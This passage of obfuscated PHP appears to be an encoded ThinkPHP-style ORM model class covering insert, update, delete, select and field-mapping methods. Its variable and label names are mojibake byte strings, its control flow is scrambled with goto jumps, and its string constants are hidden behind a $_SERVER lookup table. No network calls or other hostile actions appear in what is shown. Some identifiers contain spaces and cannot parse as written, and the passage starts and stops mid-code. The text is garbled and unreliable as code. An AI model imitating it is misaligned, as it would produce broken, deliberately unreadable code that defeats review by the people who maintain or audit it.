switchModel($aò§‡ûõÜì, $dÿ≠ﬂÀÿµ¡ = array()) { $b÷Üâ»ñ∏Ü =& $_SERVER[Öíæ€“”≠éÏË]; $d∫èﬁï»àì = ucwords(strtolower($aò§‡ûõÜì)) . $b÷Üâ»ñ∏Ü[251]; if (!class_exists($d∫èﬁï»àì)) { think_exception($d∫èﬁï»àì . think_lang($b÷Üâ»ñ∏Ü[252])); } $this->_extModel = new $d∫èﬁï»àì($this->name); if (!empty($dÿ≠ﬂÀÿµ¡)) { foreach ($dÿ≠ﬂÀÿµ¡ as $E£åÑÍÔÎ) { $this->_extModel->setProperty($E£åÑÍÔÎ, $this->{$E£åÑÍÔÎ}); } } return $this->_extModel; } public function __set($DãÑÜêŒ¿›, $D¢µ™óÚŸ¬) { $this->data[$DãÑÜêŒ¿›] = $D¢µ™óÚŸ¬; } public function __get($B§÷√¶¢ëó) { return isset($this->data[$B§÷√¶¢ëó]) ? $this->data[$B§÷√¶¢ëó] : null; } public function __isset($Fª∏í”Èìç) { return isset($this->data[$Fª∏í”Èìç]); } public function __unset($BÛçÀÎå£í) { unset($this->data[$BÛçÀÎå£í]); } public function __call($c€ı≥÷ëû«, $E÷¿Ü¿ÂíΩ) { $eÇ‡É·¯ªó =& $_SERVER[Öíæ€“”≠éÏË]; if (in_array(strtolower($c€ı≥÷ëû«), $this->methods, !0)) { $this->options[strtolower($c€ı≥÷ëû«)] = $E÷¿Ü¿ÂíΩ[0]; return $this; } elseif (in_array(strtolower($c€ı≥÷ëû«), array($eÇ‡É·¯ªó[253], $eÇ‡É·¯ªó[254], $eÇ‡É·¯ªó[255], $eÇ‡É·¯ªó[256], $eÇ‡É·¯ªó[257]), !0)) { $D‰åÈâã„– = isset($E÷¿Ü¿ÂíΩ[0]) ? $E÷¿Ü¿ÂíΩ[0] : $eÇ‡É·¯ªó[182]; $D‰åÈâã„– = $this->db->parseKey($D‰åÈâã„–); return $this->getField(strtoupper($c€ı≥÷ëû«) . $eÇ‡É·¯ªó[258] . $D‰åÈâã„– . $eÇ‡É·¯ªó[259] . $c€ı≥÷ëû«, $eÇ‡É·¯ªó[253]); } elseif (strtolower(substr($c€ı≥÷ëû«, 0, 5)) == $eÇ‡É·¯ªó[260]) { $D‰åÈâã„– = think_parse_name(substr($c€ı≥÷ëû«, 5)); $aº¡‘¶¿åê[$D‰åÈâã„–] = $E÷¿Ü¿ÂíΩ[0]; return $this->where($aº¡‘¶¿åê)->find(); } elseif (strtolower(substr($c€ı≥÷ëû«, 0, 10)) == $eÇ‡É·¯ªó[261]) { $Aÿõí¬ê‹∑ = think_parse_name(substr($c€ı≥÷ëû«, 10)); $aº¡‘¶¿åê[$Aÿõí¬ê‹∑] = $E÷¿Ü¿ÂíΩ[0]; return $this->where($aº¡‘¶¿åê)->getField($E÷¿Ü¿ÂíΩ[1]); } elseif (isset($this->_scope[$c€ı≥÷ëû«])) { return $this->scope($c€ı≥÷ëû«, $E÷¿Ü¿ÂíΩ[0]); } elseif (method_exists($this, $c€ı≥÷ëû«)) { array_unshift($E÷¿Ü¿ÂíΩ, $c€ı≥÷ëû«); return call_user_func_array(array($this, $eÇ‡É·¯ªó[262]), $E÷¿Ü¿ÂíΩ); } else { return call_user_func_array(array(parent, $c€ı≥÷ëû«), $E÷¿Ü¿ÂíΩ); } } protected function call() { goto dœß •’Ç; c›±õÆ¯áº: if (isset($fìéåè˜∂Ã[$b¡¶§ÀŒÌß]) && $fìéåè˜∂Ã[$b¡¶§ÀŒÌß] === $bÃé™‚ùôó) { think_exception(__CLASS__ . $A¿ÿˆâùõÆ[4] . $bÃé™‚ùôó . think_lang($A¿ÿˆâùõÆ[263])); return; } $fìéåè˜∂Ã[] = $bÃé™‚ùôó; if (method_exists($this, $A¿ÿˆâùõÆ[264])) { $CΩ›óƒ€Ë÷ = call_user_func_array(array($this, $A¿ÿˆâùõÆ[265]), array($C™„ù«Øπ¨, $fìéåè˜∂Ã)); if (!is_null($CΩ›óƒ€Ë÷) && $CΩ›óƒ€Ë÷ !== !1) { return $CΩ›óƒ€Ë÷; } } goto C§ Ñè–Â≈; F‹±µÜ≈ﬂ€: $C™„ù«Øπ¨ = $bÃé™‚ùôó; if (is_array($bÃé™‚ùôó)) { $C™„ù«Øπ¨ = $bÃé™‚ùôó[1]; $bÃé™‚ùôó = $bÃé™‚ùôó[0]; } $b¡¶§ÀŒÌß = count($fìéåè˜∂Ã) - 1; goto c›±õÆ¯áº; C§ Ñè–Â≈: $bËÿØ≤ı≤≤ = call_user_func_array(array($this, $bÃé™‚ùôó), $fìéåè˜∂Ã); if (method_exists($this, $A¿ÿˆâùõÆ[266])) { $CΩ›óƒ€Ë÷ = call_user_func_array(array($this, $A¿ÿˆâùõÆ[267]), array($C™„ù«Øπ¨, $fìéåè˜∂Ã, $bËÿØ≤ı≤≤)); if ($CΩ›óƒ€Ë÷) { return $CΩ›óƒ€Ë÷; } } return $bËÿØ≤ı≤≤; goto C¯»√Ñ¶‹∑; dœß •’Ç: $A¿ÿˆâùõÆ =& $_SERVER[Öíæ€“”≠éÏË]; $fìéåè˜∂Ã = func_get_args(); $bÃé™‚ùôó = array_shift($fìéåè˜∂Ã); goto F‹±µÜ≈ﬂ€; C¯»√Ñ¶‹∑: } protected function _initialize() { } protected function _facade($A°∑≥¶·Ã∂) { $a©úÙπÊøÈ =& $_SERVER[Öíæ€“”≠éÏË]; if (!empty($this->fields)) { foreach ($A°∑≥¶·Ã∂ as $AΩ√çÉ¬ï≈ => $dÓΩÒô åÕ) { if (is_array($this->fields) && !in_array($AΩ√çÉ¬ï≈, $this->fields, !0)) { unset($A°∑≥¶·Ã∂[$AΩ√çÉ¬ï≈]); } elseif (is_scalar($dÓΩÒô åÕ)) { $this->_parseType($A°∑≥¶·Ã∂, $AΩ√çÉ¬ï≈); } } } if (!empty($this->options[$a©úÙπÊøÈ[268]])) { $A°∑≥¶·Ã∂ = array_map($this->options[$a©úÙπÊøÈ[268]], $A°∑≥¶·Ã∂); unset($this->options[$a©úÙπÊøÈ[268]]); } $this->_beforeWrite($A°∑≥¶·Ã∂); return $A°∑≥¶·Ã∂; } protected function _beforeWrite(&$e˜«ÁÙ¬Ï„) { } public function add($Cœ˘¿ﬂ¿ØΩ = '', $E£∏‘—æ√™ = array(), $A“‹—ôï≥ì = false) { goto FÇå⁄®ÆÉ›; Bƒú¡·ı∆«: if (!1 === $this->_beforeInsert($Cœ˘¿ﬂ¿ØΩ, $E£∏‘—æ√™)) { return !1; } $e¯õñ©›ƒ„ = $this->db->insert($Cœ˘¿ﬂ¿ØΩ, $E£∏‘—æ√™, $A“‹—ôï≥ì); if (!1 !== $e¯õñ©›ƒ„) { $bﬂê¿πôÎÆ = $this->getLastInsID(); if ($bﬂê¿πôÎÆ) { $Cœ˘¿ﬂ¿ØΩ[$this->getPk()] = $bﬂê¿πôÎÆ; $this->_after_insert($Cœ˘¿ﬂ¿ØΩ, $E£∏‘—æ√™); return $bﬂê¿πôÎÆ; } $this->_after_insert($Cœ˘¿ﬂ¿ØΩ, $E£∏‘—æ√™); } goto eû»√ôªô„; FÇå⁄®ÆÉ›: if (empty($Cœ˘¿ﬂ¿ØΩ)) { if (!empty($this->data)) { $Cœ˘¿ﬂ¿ØΩ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Öíæ€“”≠éÏË][269]); return !1; } } $E£∏‘—æ√™ = $this->_parseOptions($E£∏‘—æ√™); $Cœ˘¿ﬂ¿ØΩ = $this->_facade($Cœ˘¿ﬂ¿ØΩ); goto Bƒú¡·ı∆«; eû»√ôªô„: return $e¯õñ©›ƒ„; goto cÃîçˆÀ≥π; cÃîçˆÀ≥π: } protected function _beforeInsert(&$dè§ñÓ¢êÌ, $Bæ›ööÓ‹¢) { } protected function _after_insert($cãè•¨Îî’, $EÖ“Ωùìñ») { } public function addAll($Dÿﬁ‚∫Ó€ø, $B†ååÒ‘ÎÊ = array(), $fßÁ≈«ôØø = false) { goto Bç£ÕÑﬂó∞; B‚äˆó™≤Ω: return $bÿœÀÔ££–; goto B†ï€êÉπ; Bç£ÕÑﬂó∞: $FÉ√≠ûÈÌÑ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($Dÿﬁ‚∫Ó€ø)) { $this->error = think_lang($FÉ√≠ûÈÌÑ[269]); return !1; } $B†ååÒ‘ÎÊ = $this->_parseOptions($B†ååÒ‘ÎÊ); goto DçÌœ¬ä¬ñ; DçÌœ¬ä¬ñ: foreach ($Dÿﬁ‚∫Ó€ø as $AÉÿÔ≠åÜÚ => $a‰◊∏Ô≤Â‡) { $Dÿﬁ‚∫Ó€ø[$AÉÿÔ≠åÜÚ] = $this->_facade($a‰◊∏Ô≤Â‡); } if (method_exists($this->db, $FÉ√≠ûÈÌÑ[270])) { $bÿœÀÔ££– = $this->db->insertAll($Dÿﬁ‚∫Ó€ø, $B†ååÒ‘ÎÊ, $fßÁ≈«ôØø); } else { $this->startTrans(); foreach ($Dÿﬁ‚∫Ó€ø as $AÉÿÔ≠åÜÚ => $a‰◊∏Ô≤Â‡) { $bÿœÀÔ££– = $this->db->insert($a‰◊∏Ô≤Â‡, $B†ååÒ‘ÎÊ, $fßÁ≈«ôØø); } $this->commit(); } if (!1 !== $bÿœÀÔ££–) { $FΩïÎ¥˘ﬂÙ = $this->getLastInsID(); if ($FΩïÎ¥˘ﬂÙ) { return $FΩïÎ¥˘ﬂÙ; } } goto B‚äˆó™≤Ω; B†ï€êÉπ: } public function selectAdd($Bá∫˜ÉÉçû = '', $FËá¨˘≈πŸ = '', $D·Õã∑¨ﬂÊ = array()) { $B÷ˆ…üÇ∆Ñ =& $_SERVER[Öíæ€“”≠éÏË]; $D·Õã∑¨ﬂÊ = $this->_parseOptions($D·Õã∑¨ﬂÊ); if (!1 === ($f≤Í¿™áÏ = $this->db->selectInsert($Bá∫˜ÉÉçû ? $Bá∫˜ÉÉçû : $D·Õã∑¨ﬂÊ[$B÷ˆ…üÇ∆Ñ[271]], $FËá¨˘≈πŸ ? $FËá¨˘≈πŸ : $this->getTableName(), $D·Õã∑¨ﬂÊ))) { $this->error = think_lang($B÷ˆ…üÇ∆Ñ[272]); return !1; } else { return $f≤Í¿™áÏ; } } public function save($dêùÖÒÚå” = '', $BÑìÕ∫´Â„ = array()) { goto DÂﬂ…Ô÷ˆÎ; b‰îÃêÇ†à: $BÑìÕ∫´Â„ = $this->_parseOptions($BÑìÕ∫´Â„); $c’ÂÖÓõœ… = $this->getPk(); if (!isset($BÑìÕ∫´Â„[$c¡»ÑÍêäÉ[273]])) { if (isset($dêùÖÒÚå”[$c’ÂÖÓõœ…])) { $D≈“÷É„˜Œ[$c’ÂÖÓõœ…] = $dêùÖÒÚå”[$c’ÂÖÓõœ…]; $BÑìÕ∫´Â„[$c¡»ÑÍêäÉ[273]] = $D≈“÷É„˜Œ; unset($dêùÖÒÚå”[$c’ÂÖÓõœ…]); } else { $this->error = think_lang($c¡»ÑÍêäÉ[272]); return !1; } } goto CÈÕ§∂†ÑÑ; fÜ∫ÊÖ’”“: if (!1 !== $EÇ“œ∏Ì≠) { if (isset($A®∆Ñê»™í)) { $dêùÖÒÚå”[$c’ÂÖÓõœ…] = $A®∆Ñê»™í; } $this->_afterUpdate($dêùÖÒÚå”, $BÑìÕ∫´Â„); } return $EÇ“œ∏Ì≠; goto aªãåòèé™; DÂﬂ…Ô÷ˆÎ: $c¡»ÑÍêäÉ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($dêùÖÒÚå”)) { if (!empty($this->data)) { $dêùÖÒÚå” = $this->data; $this->data = array(); } else { $this->error = think_lang($c¡»ÑÍêäÉ[269]); return !1; } } $dêùÖÒÚå” = $this->_facade($dêùÖÒÚå”); goto b‰îÃêÇ†à; CÈÕ§∂†ÑÑ: if (is_array($BÑìÕ∫´Â„[$c¡»ÑÍêäÉ[273]]) && isset($BÑìÕ∫´Â„[$c¡»ÑÍêäÉ[273]][$c’ÂÖÓõœ…])) { $A®∆Ñê»™í = $BÑìÕ∫´Â„[$c¡»ÑÍêäÉ[273]][$c’ÂÖÓõœ…]; } if (!1 === $this->_beforeUpdate($dêùÖÒÚå”, $BÑìÕ∫´Â„)) { return !1; } $EÇ“œ∏Ì≠ = $this->db->update($dêùÖÒÚå”, $BÑìÕ∫´Â„); goto fÜ∫ÊÖ’”“; aªãåòèé™: } protected function _beforeUpdate(&$D£‹‡âîº¢, $aˆËœÌÉ≈˘) { } protected function _afterUpdate($båÌßﬁ£µ¥, $BËÚ‰ñÉÜü) { } public function delete($cíµ•ïﬁˆ– = array()) { goto Dæ’ÿ≈¯ì’; Dæ’ÿ≈¯ì’: $A◊‚ “¥†ë =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($cíµ•ïﬁˆ–) && empty($this->options[$A◊‚ “¥†ë[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $a‹øüâÜô∞ = $this->getPk(); goto AŒ¥’á∞ÑÌ; AŒ¥’á∞ÑÌ: if (is_numeric($cíµ•ïﬁˆ–) || is_string($cíµ•ïﬁˆ–)) { if (strpos($cíµ•ïﬁˆ–, $A◊‚ “¥†ë[47])) { $F·–’õÛΩä[$a‹øüâÜô∞] = array($A◊‚ “¥†ë[274], $cíµ•ïﬁˆ–); } else { $F·–’õÛΩä[$a‹øüâÜô∞] = $cíµ•ïﬁˆ–; } $this->options[$A◊‚ “¥†ë[273]] = $F·–’õÛΩä; } $cíµ•ïﬁˆ– = $this->_parseOptions(); if (is_array($cíµ•ïﬁˆ–[$A◊‚ “¥†ë[273]]) && isset($cíµ•ïﬁˆ–[$A◊‚ “¥†ë[273]][$a‹øüâÜô∞])) { $CßÛª…°¡  = $cíµ•ïﬁˆ–[$A◊‚ “¥†ë[273]][$a‹øüâÜô∞]; } goto B™‚çëÍÜ÷; B™‚çëÍÜ÷: $f»ÇÂ¶éî÷ = $this->db->delete($cíµ•ïﬁˆ–); if (!1 !== $f»ÇÂ¶éî÷) { $d‘Ñ¡Ë≤€ = array(); if (isset($CßÛª…°¡ )) { $d‘Ñ¡Ë≤€[$a‹øüâÜô∞] = $CßÛª…°¡ ; } $this->_after_delete($d‘Ñ¡Ë≤€, $cíµ•ïﬁˆ–); } return $f»ÇÂ¶éî÷; goto EäÎåøû˜´; EäÎåøû˜´: } protected function _after_delete($E—∂¢£πª†, $FÖ≤°¯Ó÷ß) { } public function select($EÜ≥›‰øßÆ = array()) { goto Eøßπ ï©ﬁ; e‘ê˘∏üÿô: $Eœñ∞ﬂãﬂú = $this->db->select($EÜ≥›‰øßÆ); if (!1 === $Eœñ∞ﬂãﬂú) { return !1; } if (empty($Eœñ∞ﬂãﬂú)) { return null; } goto dæÂÖñ•áÊ; Eøßπ ï©ﬁ: $e∏ìÈ±Ÿ™É =& $_SERVER[Öíæ€“”≠éÏË]; if (is_string($EÜ≥›‰øßÆ) || is_numeric($EÜ≥›‰øßÆ)) { $A¬≥µö‡òê = $this->getPk(); if (strpos($EÜ≥›‰øßÆ, $e∏ìÈ±Ÿ™É[47])) { $A©Ï»∫≈ô[$A¬≥µö‡òê] = array($e∏ìÈ±Ÿ™É[274], $EÜ≥›‰øßÆ); } else { $A©Ï»∫≈ô[$A¬≥µö‡òê] = $EÜ≥›‰øßÆ; } $this->options[$e∏ìÈ±Ÿ™É[273]] = $A©Ï»∫≈ô; } elseif (!1 === $EÜ≥›‰øßÆ) { $EÜ≥›‰øßÆ = $this->_parseOptions(); return $e∏ìÈ±Ÿ™É[275] . $this->db->buildSelectSql($EÜ≥›‰øßÆ) . $e∏ìÈ±Ÿ™É[276]; } $EÜ≥›‰øßÆ = $this->_parseOptions(); goto e‘ê˘∏üÿô; dæÂÖñ•áÊ: $this->_afterSelect($Eœñ∞ﬂãﬂú, $EÜ≥›‰øßÆ); return $Eœñ∞ﬂãﬂú; goto e€ÍŸàÑÉ¯; e€ÍŸàÑÉ¯: } protected function _afterSelect(&$C‘°∫°≠ü“, $b¡ÿ–è£È¢) { } public function buildSql($Cì©ìÇàÖÎ = array()) { $f≠ç≈£›†º =& $_SERVER[Öíæ€“”≠éÏË]; $Cì©ìÇàÖÎ = $this->_parseOptions($Cì©ìÇàÖÎ); return $f≠ç≈£›†º[275] . $this->db->buildSelectSql($Cì©ìÇàÖÎ) . $f≠ç≈£›†º[276]; } public function optionsValue($d«ÒÚÀ€≤£ = null) { if (is_null($d«ÒÚÀ€≤£)) { return $this->options; } elseif (is_array($d«ÒÚÀ€≤£)) { $this->options = array_merge($this->options, $d«ÒÚÀ€≤£); } } protected function _parseOptions($E†çÒ≈°…„ = array()) { goto BÜä¯ª≈ë†; bÈ⁄≥ù€ï: if (!isset($E†çÒ≈°…„[$A¶¬…‹Ö˘É[277]])) { $E†çÒ≈°…„[$A¶¬…‹Ö˘É[277]] = $this->getTableName(); $c•§»°ü⁄Ç = $this->fields; } else { $c•§»°ü⁄Ç = $this->getDbFields(); } if (!empty($E†çÒ≈°…„[$A¶¬…‹Ö˘É[278]])) { $E†çÒ≈°…„[$A¶¬…‹Ö˘É[277]] .= $A¶¬…‹Ö˘É[50] . $E†çÒ≈°…„[$A¶¬…‹Ö˘É[278]]; } $E†çÒ≈°…„[$A¶¬…‹Ö˘É[279]] = $this->name; goto b◊ãôéçùµ; BÜä¯ª≈ë†: $A¶¬…‹Ö˘É =& $_SERVER[Öíæ€“”≠éÏË]; if (is_array($E†çÒ≈°…„)) { $E†çÒ≈°…„ = array_merge($this->options, $E†çÒ≈°…„); } $this->options = array(); goto bÈ⁄≥ù€ï; b◊ãôéçùµ: if (isset($E†çÒ≈°…„[$A¶¬…‹Ö˘É[273]]) && is_array($E†çÒ≈°…„[$A¶¬…‹Ö˘É[273]]) && !empty($c•§»°ü⁄Ç) && !isset($E†çÒ≈°…„[$A¶¬…‹Ö˘É[280]]) && !isset($E†çÒ≈°…„[$A¶¬…‹Ö˘É[277]])) { foreach ($E†çÒ≈°…„[$A¶¬…‹Ö˘É[273]] as $Aµá«ËÑ„ª => $a†Úä‰–àë) { $Aµá«ËÑ„ª = trim($Aµá«ËÑ„ª); if (in_array($Aµá«ËÑ„ª, $c•§»°ü⁄Ç, !0)) { if (is_scalar($a†Úä‰–àë)) { $this->_parseType($E†çÒ≈°…„[$A¶¬…‹Ö˘É[273]], $Aµá«ËÑ„ª); } } elseif (!is_numeric($Aµá«ËÑ„ª) && $A¶¬…‹Ö˘É[71] != substr($Aµá«ËÑ„ª, 0, 1) && !1 === strpos($Aµá«ËÑ„ª, $A¶¬…‹Ö˘É[95]) && !1 === strpos($Aµá«ËÑ„ª, $A¶¬…‹Ö˘É[258]) && !1 === strpos($Aµá«ËÑ„ª, $A¶¬…‹Ö˘É[281]) && !1 === strpos($Aµá«ËÑ„ª, $A¶¬…‹Ö˘É[282])) { unset($E†çÒ≈°…„[$A¶¬…‹Ö˘É[273]][$Aµá«ËÑ„ª]); } } } $this->_options_filter($E†çÒ≈°…„); return $E†çÒ≈°…„; goto cç—à¡ÖÚ¥; cç—à¡ÖÚ¥: } protected function _options_filter(&$fØã†¯•≠õ) { } protected function _parseType(&$AÀå™≤ﬂ®¿, $F¬ßıÕî´ö) { $C›Â£õ˘êê =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($this->options[$C›Â£õ˘êê[283]][$C›Â£õ˘êê[4] . $F¬ßıÕî´ö])) { $Bø∆êíãÊç = strtolower($this->fields[$C›Â£õ˘êê[250]][$F¬ßıÕî´ö]); if (!1 !== strpos($Bø∆êíãÊç, $C›Â£õ˘êê[284])) { } elseif (!1 === strpos($Bø∆êíãÊç, $C›Â£õ˘êê[285]) && !1 !== strpos($Bø∆êíãÊç, $C›Â£õ˘êê[286])) { $AÀå™≤ﬂ®¿[$F¬ßıÕî´ö] = intval($AÀå™≤ﬂ®¿[$F¬ßıÕî´ö]); } elseif (!1 !== strpos($Bø∆êíãÊç, $C›Â£õ˘êê[287]) || !1 !== strpos($Bø∆êíãÊç, $C›Â£õ˘êê[288])) { $AÀå™≤ﬂ®¿[$F¬ßıÕî´ö] = floatval($AÀå™≤ﬂ®¿[$F¬ßıÕî´ö]); } elseif (!1 !== strpos($Bø∆êíãÊç, $C›Â£õ˘êê[289])) { $AÀå™≤ﬂ®¿[$F¬ßıÕî´ö] = (bool) $AÀå™≤ﬂ®¿[$F¬ßıÕî´ö]; } } } public function find($e¬ÎñÎıŸﬁ = array()) { goto døõøÚ‰°à; døõøÚ‰°à: $EÑ´∂„®œ∆ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_numeric($e¬ÎñÎıŸﬁ) || is_string($e¬ÎñÎıŸﬁ)) { $E’ﬂå®òΩŒ[$this->getPk()] = intval($e¬ÎñÎıŸﬁ); $this->options[$EÑ´∂„®œ∆[273]] = $E’ﬂå®òΩŒ; } $this->options[$EÑ´∂„®œ∆[290]] = 1; goto B„´ëãﬂß…; dÉ€ïçîı„: if (empty($bÏôÎ•ΩÉê)) { return null; } $this->data = $bÏôÎ•ΩÉê[0]; $this->_afterFind($this->data, $e¬ÎñÎıŸﬁ); goto BåÁŸçê∆™; BåÁŸçê∆™: if (!empty($this->options[$EÑ´∂„®œ∆[291]])) { return $this->returnResult($this->data, $this->options[$EÑ´∂„®œ∆[291]]); } return $this->data; goto c˘ïÉÇê◊; B„´ëãﬂß…: $e¬ÎñÎıŸﬁ = $this->_parseOptions(); $bÏôÎ•ΩÉê = $this->db->select($e¬ÎñÎıŸﬁ); if (!1 === $bÏôÎ•ΩÉê) { return !1; } goto dÉ€ïçîı„; c˘ïÉÇê◊: } protected function _afterFind(&$FÓè˘¿ÕéÆ, $E†–©¢≤≈º) { } protected function returnResult($BÁ√ßƒü∫…, $A†èŒä•Ñâ = '') { $Déµ≠º¿¶° =& $_SERVER[Öíæ€“”≠éÏË]; if ($A†èŒä•Ñâ) { if (is_callable($A†èŒä•Ñâ)) { return call_user_func($A†èŒä•Ñâ, $BÁ√ßƒü∫…); } switch (strtolower($A†èŒä•Ñâ)) { case $Déµ≠º¿¶°[292]: return json_encode($BÁ√ßƒü∫…); case $Déµ≠º¿¶°[293]: return xml_encode($BÁ√ßƒü∫…); } } return $BÁ√ßƒü∫…; } public function parseFieldsMap($E›Öá£Ù˘◊, $E•‹Ùﬂ É≥ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $a·ÚœΩÒÃÜ => $f˜‡ÊÇàÉ≈) { if ($E•‹Ùﬂ É≥ == 1) { if (isset($E›Öá£Ù˘◊[$f˜‡ÊÇàÉ≈])) { $E›Öá£Ù˘◊[$a·ÚœΩÒÃÜ] = $E›Öá£Ù˘◊[$f˜‡ÊÇàÉ≈]; unset($E›Öá£Ù˘◊[$f˜‡ÊÇàÉ≈]); } } else { if (isset($E›Öá£Ù˘◊[$a·ÚœΩÒÃÜ])) { $E›Öá£Ù˘◊[$f˜‡ÊÇàÉ≈] = $E›Öá£Ù˘◊[$a·ÚœΩÒÃÜ]; unset($E›Öá£Ù˘◊[$a·ÚœΩÒÃÜ]); } } } } return $E›Öá£Ù˘◊; } public function setField($d‰ÃÏ∞°±ä, $B™í◊È·û… = '') { if (is_array($d‰ÃÏ∞°±ä)) { $E€≠á∫ª‹ = $d‰ÃÏ∞°±ä; } else { $E€≠á∫ª‹[$d‰ÃÏ∞°±ä] = $B™í◊È·û…; } return $this->save($E€≠á∫ª‹); } public function setAdd($dòªë‘Íò™, $f“©–Æ≠™è = 1) { $EÚ‚åå·Ö° =& $_SERVER[Öíæ€“”≠éÏË]; $dÙÈ—µáŸÔ = $dòªë‘Íò™ . $EÚ‚åå·Ö°[294] . $f“©–Æ≠™è; if ($f“©–Æ≠™è < 0) { $dÙÈ—µáŸÔ = $dòªë‘Íò™ . $f“©–Æ≠™è; } return $this->setField($dòªë‘Íò™, array($EÚ‚åå·Ö°[295], $dÙÈ—µáŸÔ)); } public function getField($f≥∏¯Ö®·ì, $B£¬ºÉ€Œø = null) { $Bã§°æ·ÎÒ =& $_SERVER[Öíæ€“”≠éÏË]; $D• Ò›ÛÒ’[$Bã§°æ·ÎÒ[271]] = $f≥∏¯Ö®·ì; $D• Ò›ÛÒ’ = $this->_parseOptions($D• Ò›ÛÒ’); $f≥∏¯Ö®·ì = trim($f≥∏¯Ö®·ì); if (strpos($f≥∏¯Ö®·ì, $Bã§°æ·ÎÒ[47])) { if (!isset($D• Ò›ÛÒ’[$Bã§°æ·ÎÒ[290]])) { $D• Ò›ÛÒ’[$Bã§°æ·ÎÒ[290]] = is_numeric($B£¬ºÉ€Œø) ? $B£¬ºÉ€Œø : $Bã§°æ·ÎÒ[33]; } $D≤Ááù£•… = $this->db->select($D• Ò›ÛÒ’); if (!empty($D≤Ááù£•…)) { goto e¥‚ïŸê≠©; e¥‚ïŸê≠©: $E∆≠û«âÚﬂ = explode($Bã§°æ·ÎÒ[47], $f≥∏¯Ö®·ì); $f≥∏¯Ö®·ì = array_keys($D≤Ááù£•…[0]); $cäúß”±Òá = array_shift($f≥∏¯Ö®·ì); goto C°ÜïáíÍ©; cÆâ«ﬁëﬂ’: foreach ($D≤Ááù£•… as $Cô‰óç…¯Ñ) { $c∞ı≥®ìáÖ = $Cô‰óç…¯Ñ[$cäúß”±Òá]; if (2 == $DïıëÓ©Ñ›) { $Eè≤·Æ∂úè[$c∞ı≥®ìáÖ] = $Cô‰óç…¯Ñ[$E«Œêëáã–]; } else { $Eè≤·Æ∂úè[$c∞ı≥®ìáÖ] = is_string($B£¬ºÉ€Œø) ? implode($B£¬ºÉ€Œø, $Cô‰óç…¯Ñ) : $Cô‰óç…¯Ñ; } } return $Eè≤·Æ∂úè; goto CÜ§ï´‰√—; C°ÜïáíÍ©: $E«Œêëáã– = array_shift($f≥∏¯Ö®·ì); $Eè≤·Æ∂úè = array(); $DïıëÓ©Ñ› = count($E∆≠û«âÚﬂ); goto cÆâ«ﬁëﬂ’; CÜ§ï´‰√—: } } else { if (!0 !== $B£¬ºÉ€Œø) { $D• Ò›ÛÒ’[$Bã§°æ·ÎÒ[290]] = is_numeric($B£¬ºÉ€Œø) ? $B£¬ºÉ€Œø : 1; } if ($B£¬ºÉ€Œø === $Bã§°æ·ÎÒ[253]) { unset($D• Ò›ÛÒ’[$Bã§°æ·ÎÒ[290]]); } $Cô‰óç…¯Ñ = $this->db->select($D• Ò›ÛÒ’); if (!empty($Cô‰óç…¯Ñ)) { if ($B£¬ºÉ€Œø === $Bã§°æ·ÎÒ[253]) { return reset($Cô‰óç…¯Ñ[0]); } if (!0 !== $B£¬ºÉ€Œø && 1 == $D• Ò›ÛÒ’[$Bã§°æ·ÎÒ[290]]) { return reset($Cô‰óç…¯Ñ[0]); } foreach ($Cô‰óç…¯Ñ as $Fî¥‘ã™Ï¢) { $eåâ”Ë–´§[] = $Fî¥‘ã™Ï¢[$f≥∏¯Ö®·ì]; } return $eåâ”Ë–´§; } } return null; } public function create($Fæ¶∆èò›¨ = '', $d‘—ÚØÂÜô = '') { goto bÖ∞Úåﬂµ¡; bÖ∞Úåﬂµ¡: $F¨ÿ√„Œß≠ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($Fæ¶∆èò›¨)) { $Fæ¶∆èò›¨ = $_POST; } elseif (is_object($Fæ¶∆èò›¨)) { $Fæ¶∆èò›¨ = get_object_vars($Fæ¶∆èò›¨); } if (empty($Fæ¶∆èò›¨) || !is_array($Fæ¶∆èò›¨)) { $this->error = think_lang($F¨ÿ√„Œß≠[269]); return !1; } goto fΩ˘âÂÃØ∑; fΩ˘âÂÃØ∑: $Fæ¶∆èò›¨ = $this->parseFieldsMap($Fæ¶∆èò›¨, 0); $d‘—ÚØÂÜô = $d‘—ÚØÂÜô ? $d‘—ÚØÂÜô : (!empty($Fæ¶∆èò›¨[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$F¨ÿ√„Œß≠[271]])) { $a÷Ê‡µ »ﬂ = $this->options[$F¨ÿ√„Œß≠[271]]; unset($this->options[$F¨ÿ√„Œß≠[271]]); } elseif ($d‘—ÚØÂÜô == THINK_MODEL_INSERT && isset($this->insertFields)) { $a÷Ê‡µ »ﬂ = $this->insertFields; } elseif ($d‘—ÚØÂÜô == THINK_MODEL_UPDATE && isset($this->updateFields)) { $a÷Ê‡µ »ﬂ = $this->updateFields; } goto BË›◊ò©ãµ; Böãô∑ç»ò: return $Fæ¶∆èò›¨; goto eÇß„îï°; c∂’îâﬂË–: if ($this->autoCheckFields) { $a÷Ê‡µ »ﬂ = $this->getDbFields(); foreach ($Fæ¶∆èò›¨ as $B‚Ëø»óï‘ => $eÖ¥˘ıÀ˘≥) { if (!in_array($B‚Ëø»óï‘, $a÷Ê‡µ »ﬂ)) { unset($Fæ¶∆èò›¨[$B‚Ëø»óï‘]); } elseif (MAGIC_QUOTES_GPC && is_string($eÖ¥˘ıÀ˘≥)) { $Fæ¶∆èò›¨[$B‚Ëø»óï‘] = stripslashes($eÖ¥˘ıÀ˘≥); } } } $this->autoOperation($Fæ¶∆èò›¨, $d‘—ÚØÂÜô); $this->data = $Fæ¶∆èò›¨; goto Böãô∑ç»ò; BË›◊ò©ãµ: if (isset($a÷Ê‡µ »ﬂ)) { if (is_string($a÷Ê‡µ »ﬂ)) { $a÷Ê‡µ »ﬂ = explode($F¨ÿ√„Œß≠[47], $a÷Ê‡µ »ﬂ); } if (think_config($F¨ÿ√„Œß≠[296])) { $a÷Ê‡µ »ﬂ[] = think_config($F¨ÿ√„Œß≠[297]); } foreach ($Fæ¶∆èò›¨ as $B‚Ëø»óï‘ => $eÖ¥˘ıÀ˘≥) { if (!in_array($B‚Ëø»óï‘, 